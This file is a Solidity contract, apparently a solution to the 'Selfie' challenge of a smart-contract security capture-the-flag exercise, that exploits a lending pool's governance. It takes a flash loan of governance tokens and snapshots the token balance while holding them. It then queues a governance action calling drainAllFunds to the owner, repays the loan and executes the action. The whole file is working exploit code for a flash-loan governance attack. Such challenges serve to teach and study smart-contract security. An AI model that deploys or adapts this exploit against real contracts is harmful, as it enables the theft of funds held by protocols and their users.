// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "./SelfiePool.sol";

/**
 * @title SelfieAttacker
 * @author soyccan (soyccan@gmail.com)
 * @notice Exploit the governance of a selfie pool with enourmous governance
 *         tokens borrowed from flash loans offered by the same pool
 */
contract SelfieAttacker is Ownable {
    SelfiePool private immutable pool;
    uint256 private actionId;

    constructor(address poolAddr) {
        pool = SelfiePool(poolAddr);
    }

    // flash loan receiver
    function receiveTokens(address tokenAddr, uint256 amount) external {
        // take a snapshot of the governance token when we are rich
        pool.governance().governanceToken().snapshot();

        // enqueue a governance action which will drain all the pool's funds
        // this checks if our governance tokens at the last snapshot are enough
        actionId = pool.governance().queueAction(
            address(pool), // receiver
            abi.encodeWithSignature("drainAllFunds(address)", owner()), // calldata
            0 // weiAmount
        );

        // repay the loan
        ERC20Snapshot(tokenAddr).transfer(msg.sender, amount);
    }

    function setup(uint256 amount) external {
        pool.flashLoan(amount);
    }

    // should be called after setup()
    function attack() external {
        // execute the exploit
        pool.governance().executeAction(actionId);
    }
}
